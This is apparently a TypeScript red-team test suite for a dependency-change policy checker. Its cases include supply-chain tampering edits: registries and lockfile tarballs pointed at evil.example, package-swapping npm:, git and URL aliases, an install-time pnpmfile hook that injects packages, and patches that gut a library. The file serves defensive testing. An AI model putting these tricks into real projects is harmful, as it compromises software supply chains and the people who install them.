// dependencies.* attacks: manifests and lockfiles the reader doesn't know, version changes it
// understates, and lockfile changes riding on a manifest change that changes nothing.
import type { PolicyLayer } from "../../src/index";
import { add, edit } from "../types";
import type { Attack } from "./types";

const pkg = (dependencies: Record<string, string>, extra: Record<string, unknown> = {}) =>
  `${JSON.stringify({ name: "shop", version: "1.0.0", description: "Shop", dependencies, ...extra }, null, 2)}\n`;

const mode = (value: "patch" | "minor" | "any", allowNew = false): PolicyLayer => ({
  dependencies: { mode: value, allowNew },
});

const LOCK =
  "lockfileVersion: '9.0'\n\npackages:\n\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-AAA}\n";
const EVIL_LOCK = LOCK.replace(
  "sha512-AAA",
  "sha512-EVIL, tarball: https://evil.example/left-pad.tgz",
);

export const dependencyAttacks: Attack[] = [
  // ------------------------------------------------------------------ controls (should be blocked)
  ...(
    [
      ["^ to >=", "^1.2.3", ">=1.2.3", "minor"],
      ["a hyphen range", "1.2.3", "1.2.3 - 2.0.0", "minor"],
      ["an || range", "^1.2.3", "^1.2.3 || ^2.0.0", "minor"],
      ["latest", "1.2.3", "latest", "minor"],
      ["x", "1.2.3", "x", "minor"],
      ["a pre-release of the next major", "^1.2.3", "^2.0.0-rc.1", "minor"],
      ["an npm: alias", "^1.2.3", "npm:evil-pad@^1.2.3", "minor"],
    ] as const
  ).map(([what, from, to, level]): Attack => ({
    name: `control: ${what} (${level})`,
    idea: `${from} -> ${to}.`,
    policy: mode(level),
    changes: [edit("package.json", pkg({ "left-pad": from }), pkg({ "left-pad": to }))],
    violations: ["dependencies.mode"],
  })),
  {
    name: "control: PEP 440 epoch 1!2.0 (minor)",
    idea: "==1.0 -> ==1!2.0 (an epoch outranks every plain version).",
    policy: mode("minor"),
    changes: [edit("requirements.txt", "django==4.2.1\n", "Django==1!2.0\n")],
    violations: ["dependencies.mode"],
  },
  {
    name: "control: a new package in peerDependencies (patch)",
    idea: "npm 7+ installs peers.",
    policy: mode("patch"),
    changes: [
      edit(
        "package.json",
        pkg({ zod: "4.1.0" }),
        pkg({ zod: "4.1.0" }, { peerDependencies: { evil: "1.0.0" } }),
      ),
    ],
    violations: ["dependencies.allowNew"],
  },
  {
    name: "control: a Poetry table with extras (patch)",
    idea: "{ version = '^1.0' } -> { version = '^1.0', extras = ['all'] }.",
    policy: mode("patch"),
    changes: [
      edit(
        "pyproject.toml",
        '[tool.poetry.dependencies]\nhttpx = { version = "^0.27" }\n',
        '[tool.poetry.dependencies]\nhttpx = { version = "^0.27", extras = ["http2"] }\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },

  // ------------------------------------------------------------------ manifests and lockfiles not read
  {
    name: "test-requirements.txt (OpenStack naming)",
    idea: "Only requirements*/constraints* basenames and requirements/*.txt are manifests.",
    changes: [
      edit("test-requirements.txt", "pytest==8.3.0\n", "pytest==8.3.0\nevil-helper==1.0\n"),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "dev-requirements.txt bump",
    idea: "Same: a pin moved by a major in an unread file.",
    changes: [edit("dev-requirements.txt", "pytest==7.4.0\n", "pytest==9.0.0\n")],
    violations: ["dependencies.mode"],
  },
  {
    name: "pylock.toml (PEP 751 lockfile)",
    idea: "The standard Python lockfile isn't in LOCKFILES.",
    changes: [
      edit(
        "pylock.toml",
        'lock-version = "1.0"\n[[packages]]\nname = "httpx"\nversion = "0.27.0"\n',
        'lock-version = "1.0"\n[[packages]]\nname = "httpx"\nversion = "0.28.0"\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "conda environment.yml",
    idea: "A conda manifest adds a package.",
    changes: [
      edit(
        "environment.yml",
        "dependencies:\n  - python=3.12\n",
        "dependencies:\n  - python=3.12\n  - evil-helper=1.0\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "pnpm catalog version in pnpm-workspace.yaml",
    idea: 'Packages say "catalog:"; the version lives in pnpm-workspace.yaml, which nobody reads.',
    changes: [
      edit(
        "pnpm-workspace.yaml",
        "packages:\n  - packages/*\ncatalog:\n  zod: 4.1.0\n",
        "packages:\n  - packages/*\ncatalog:\n  zod: 5.0.0\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "pnpm overrides in pnpm-workspace.yaml",
    idea: "pnpm 10 reads overrides from pnpm-workspace.yaml (package.json's pnpm.overrides is a setting).",
    changes: [
      edit(
        "pnpm-workspace.yaml",
        "packages:\n  - packages/*\n",
        "packages:\n  - packages/*\noverrides:\n  left-pad: npm:evil-pad@1.0.0\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: ".npmrc registry switched",
    idea: "Index URLs are settings in requirements files, but .npmrc isn't read.",
    changes: [
      edit(
        ".npmrc",
        "registry=https://registry.npmjs.org/\n",
        "registry=https://evil.example/npm/\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: ".yarnrc.yml packageExtensions",
    idea: "Adds a dependency to a third-party package's manifest.",
    changes: [
      edit(
        ".yarnrc.yml",
        "nodeLinker: node-modules\n",
        'nodeLinker: node-modules\npackageExtensions:\n  "left-pad@*":\n    dependencies:\n      evil-helper: "1.0.0"\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: ".pnpmfile.cjs readPackage hook",
    idea: "Rewrites any package's dependencies at install time.",
    changes: [
      add(
        ".pnpmfile.cjs",
        'module.exports = { hooks: { readPackage(pkg) { pkg.dependencies["evil-helper"] = "1.0.0"; return pkg; } } };\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "a patch-package patch to a dependency",
    idea: "patches/<pkg>+<version>.patch is applied on install: third-party code changed.",
    changes: [
      add(
        "patches/left-pad+1.3.0.patch",
        "--- a/node_modules/left-pad/index.js\n+++ b/node_modules/left-pad/index.js\n@@ -1 +1 @@\n-module.exports = leftPad;\n+module.exports = () => '';\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "setup.py install_requires (documented as not read)",
    idea: "A new package in setup.py.",
    changes: [
      edit(
        "setup.py",
        'setup(name="shop", install_requires=["httpx==0.27.0"])\n',
        'setup(name="shop", install_requires=["httpx==0.27.0", "evil-helper"])\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "[tool.uv] override-dependencies with protectedConfigs off (frozen)",
    idea: "Only caught as a protected config; switch that off and the frozen deps rule doesn't see it.",
    policy: { protectedConfigs: false },
    changes: [
      edit(
        "pyproject.toml",
        '[project]\nname = "shop"\ndependencies = ["httpx==0.27.0"]\n',
        '[project]\nname = "shop"\ndependencies = ["httpx==0.27.0"]\n\n[tool.uv]\noverride-dependencies = ["httpx==0.28.1"]\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "setup.cfg install_requires with protectedConfigs off (frozen)",
    idea: "Same: setup.cfg's [options] install_requires isn't a manifest.",
    policy: { protectedConfigs: false },
    changes: [
      edit(
        "setup.cfg",
        "[options]\ninstall_requires =\n    httpx==0.27.0\n",
        "[options]\ninstall_requires =\n    httpx==0.27.0\n    evil-helper==1.0\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: ".nvmrc / .python-version toolchain bump",
    idea: "The runtime CI installs changes; not a dependency by the reader's definition.",
    changes: [edit(".nvmrc", "20\n", "24\n"), edit(".python-version", "3.11\n", "3.13\n")],
    violations: ["dependencies.mode", "dependencies.mode"],
  },

  // ------------------------------------------------------------------ lockfiles riding along
  {
    name: "lockfile + a package.json description change (patch)",
    idea: "Any byte change to a manifest 'goes with' the lockfile, even outside dependencies.",
    policy: mode("patch"),
    changes: [
      edit(
        "package.json",
        pkg({ "left-pad": "1.3.0" }),
        pkg({ "left-pad": "1.3.0" }).replace('"Shop"', '"A shop"'),
      ),
      edit("pnpm-lock.yaml", LOCK, EVIL_LOCK),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "pnpm-lock.yaml + a comment in docs/requirements.txt (patch)",
    idea: "The manifest that 'goes with' it can be in another ecosystem and directory.",
    policy: mode("patch"),
    changes: [
      edit("docs/requirements.txt", "mkdocs==1.6.0\n", "# docs\nmkdocs==1.6.0\n"),
      edit("pnpm-lock.yaml", LOCK, EVIL_LOCK),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "lockfile with a real patch bump rewrites another package (patch)",
    idea: "Documented: lockfile contents aren't compared with the manifest change.",
    policy: mode("patch"),
    changes: [
      edit(
        "package.json",
        pkg({ zod: "4.1.0", "left-pad": "1.3.0" }),
        pkg({ zod: "4.1.1", "left-pad": "1.3.0" }),
      ),
      edit("pnpm-lock.yaml", LOCK, EVIL_LOCK),
    ],
    violations: ["decision:lockfile-contents"],
  },

  // ------------------------------------------------------------------ identity and range tricks
  {
    name: "npm: alias swaps the package (any, no new packages)",
    idea: "mode any allows unreadable specs, but the package is a different one: allowNew is false.",
    policy: mode("any"),
    changes: [
      edit(
        "package.json",
        pkg({ "left-pad": "^1.3.0" }),
        pkg({ "left-pad": "npm:evil-pad@^1.3.0" }),
      ),
    ],
    violations: ["dependencies.allowNew"],
  },
  {
    name: "git URL swaps the package (any, no new packages)",
    idea: "Same with github:evil/left-pad.",
    policy: mode("any"),
    changes: [
      edit(
        "package.json",
        pkg({ "left-pad": "^1.3.0" }),
        pkg({ "left-pad": "github:evil/left-pad" }),
      ),
    ],
    violations: ["dependencies.allowNew"],
  },
  {
    name: "Python direct reference swaps the package (any, no new packages)",
    idea: "httpx==0.27.0 -> httpx @ https://evil.example/httpx.whl.",
    policy: mode("any"),
    changes: [
      edit(
        "requirements.txt",
        "httpx==0.27.0\n",
        "httpx @ https://evil.example/httpx-0.27.0.whl\n",
      ),
    ],
    violations: ["dependencies.allowNew"],
  },
  {
    name: "0.0.3 -> ~0.0.3 (patch)",
    idea: "Widening reads as 'patch', but every 0.0.x step is breaking (0.0.3 -> 0.0.4 reads as 'any').",
    policy: mode("patch"),
    changes: [edit("package.json", pkg({ tiny: "0.0.3" }), pkg({ tiny: "~0.0.3" }))],
    violations: ["dependencies.mode"],
  },
  {
    name: "0.2.3 -> ~0.2.3 (patch)",
    idea: "Lets 0.2.4 in, which the engine itself rates 'minor' (0.2.3 -> 0.2.4 is refused in patch mode).",
    policy: mode("patch"),
    changes: [edit("package.json", pkg({ tiny: "0.2.3" }), pkg({ tiny: "~0.2.3" }))],
    violations: ["dependencies.mode"],
  },
  {
    name: "0.2.3 -> ^0.2.3 (patch)",
    idea: "Same with a caret.",
    policy: mode("patch"),
    changes: [edit("package.json", pkg({ tiny: "0.2.3" }), pkg({ tiny: "^0.2.3" }))],
    violations: ["dependencies.mode"],
  },
  {
    name: "a duplicate requirement with extras, hidden by last-wins (frozen)",
    idea: "requests[socks]==2.32.3 then requests==2.32.3: the reader keeps the last; pip installs the extra's packages.",
    changes: [
      edit("requirements.txt", "requests==2.32.3\n", "requests[socks]==2.32.3\nrequests==2.32.3\n"),
    ],
    violations: ["dependencies.mode"],
  },
  // ================================================================== round 2 (after 3b71374)
  ...(
    [
      ["exec:", "exec:./scripts/make-pad.js", "Yarn Berry runs a script to build the package."],
      ["jsr:", "jsr:@evil/pad", "pnpm/npm jsr: protocol, another registry."],
      [
        "workspace:",
        "workspace:*",
        "A local package with the same name replaces the registry one.",
      ],
    ] as const
  ).map(([what, spec, idea]): Attack => ({
    name: `r2: ${what} protocol swaps the package (any, no new packages)`,
    idea: `${idea} isForeignSource is a denylist of protocols.`,
    policy: mode("any"),
    changes: [edit("package.json", pkg({ "left-pad": "^1.3.0" }), pkg({ "left-pad": spec }))],
    violations: ["dependencies.allowNew"],
  })),
  {
    name: "r2: Rye requirements.lock",
    idea: "A Python lockfile named requirements*.lock: neither a manifest (.txt/.in) nor a known lockfile.",
    changes: [edit("requirements.lock", "httpx==0.27.0\n", "httpx==0.27.0\nevil-helper==1.0\n")],
    violations: ["dependencies.mode"],
  },
  {
    name: "r2: conda-lock.yml",
    idea: "pixi.lock is known; conda-lock's lockfile isn't.",
    changes: [
      edit(
        "conda-lock.yml",
        "package:\n- name: numpy\n  version: 1.26.4\n",
        "package:\n- name: numpy\n  version: 2.1.0\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "r2: pixi.toml",
    idea: "pixi.lock is read as a lockfile, but its manifest isn't read at all.",
    changes: [
      edit(
        "pixi.toml",
        '[dependencies]\nnumpy = "1.26.*"\n',
        '[dependencies]\nnumpy = "2.*"\nevil-helper = "*"\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "r2: uv.toml / pdm.toml / bunfig.toml registries",
    idea: "Package-manager settings files other than .npmrc/.yarnrc: index URLs and overrides.",
    changes: [
      edit(
        "uv.toml",
        '[[index]]\nurl = "https://pypi.org/simple"\n',
        '[[index]]\nurl = "https://evil.example/simple"\ndefault = true\n',
      ),
      edit(
        "pdm.toml",
        '[pypi]\nurl = "https://pypi.org/simple"\n',
        '[pypi]\nurl = "https://evil.example/simple"\n',
      ),
      edit(
        "bunfig.toml",
        '[install]\nregistry = "https://registry.npmjs.org"\n',
        '[install]\nregistry = "https://evil.example/npm"\n',
      ),
    ],
    violations: ["dependencies.mode", "dependencies.mode", "dependencies.mode"],
  },
  {
    name: "r2: import_map.json version bump",
    idea: "Deno and browser import maps pin package versions.",
    changes: [
      edit(
        "import_map.json",
        '{ "imports": { "zod": "npm:zod@3.23.8" } }\n',
        '{ "imports": { "zod": "npm:zod@4.1.0" } }\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "r2: pnpm package.yaml",
    idea: "pnpm accepts package.yaml (and package.json5) as the manifest.",
    changes: [
      edit(
        "package.yaml",
        "dependencies:\n  zod: 4.1.0\n",
        "dependencies:\n  zod: 4.1.0\n  evil-helper: 1.0.0\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: 'r2: package.json "trustedDependencies" and "volta"',
    idea: "Bun runs install scripts only for trustedDependencies; volta pins the Node/npm toolchain.",
    changes: [
      edit(
        "package.json",
        pkg({ "left-pad": "1.3.0" }),
        pkg(
          { "left-pad": "1.3.0" },
          { trustedDependencies: ["left-pad"], volta: { node: "24.0.0" } },
        ),
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "r2: an existing patch outside patches/",
    idea: "pnpm patchedDependencies can point anywhere; the settings regex wants .../patches/<file>.",
    changes: [
      edit(
        ".patches/left-pad@1.3.0.patch",
        "--- a/index.js\n+++ b/index.js\n@@ -1 +1 @@\n-module.exports = leftPad;\n+module.exports = leftPad;\n",
        "--- a/index.js\n+++ b/index.js\n@@ -1 +1 @@\n-module.exports = leftPad;\n+module.exports = () => '';\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "r2: [tool.pdm.resolution] overrides with protectedConfigs off (frozen)",
    idea: "Like round 1's uv overrides: only caught as a protected config.",
    policy: { protectedConfigs: false },
    changes: [
      edit(
        "pyproject.toml",
        '[project]\nname = "shop"\ndependencies = ["httpx==0.27.0"]\n',
        '[project]\nname = "shop"\ndependencies = ["httpx==0.27.0"]\n\n[tool.pdm.resolution.overrides]\nhttpx = "0.28.1"\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  // ================================================================== round 3 (after 1535309)
  {
    name: "r3: setup.py install_requires from a variable",
    idea: "readSetupPy reads `install_requires=REQUIREMENTS`, not the list REQUIREMENTS names.",
    changes: [
      edit(
        "setup.py",
        'REQUIREMENTS = ["httpx==0.27.0"]\n\nsetup(name="shop", install_requires=REQUIREMENTS)\n',
        'REQUIREMENTS = ["httpx==0.28.1", "evil-helper"]\n\nsetup(name="shop", install_requires=REQUIREMENTS)\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "r3: setup.py with install_requires= named in a comment first",
    idea: "Only the first `install_requires=` in the file is read: a comment above the real call.",
    changes: [
      edit(
        "setup.py",
        '# Pin everything in install_requires=[...] below.\nsetup(name="shop", install_requires=["httpx==0.27.0"])\n',
        '# Pin everything in install_requires=[...] below.\nsetup(name="shop", install_requires=["httpx==0.28.1", "evil-helper"])\n',
      ),
    ],
    violations: ["dependencies.mode"],
  },
  {
    name: "r3: a lenient-name requirements file with a VCS line is never read",
    idea: "dev-requirements.txt holding `git+https://...` doesn't look like requirements, old or new, so nothing in it is compared.",
    changes: [
      edit(
        "dev-requirements.txt",
        "git+https://github.com/org/lib.git#egg=lib\npytest==7.4.0\n",
        "git+https://github.com/org/lib.git#egg=lib\npytest==9.0.0\nevil-helper==1.0\n",
      ),
    ],
    violations: ["dependencies.mode"],
  },
];
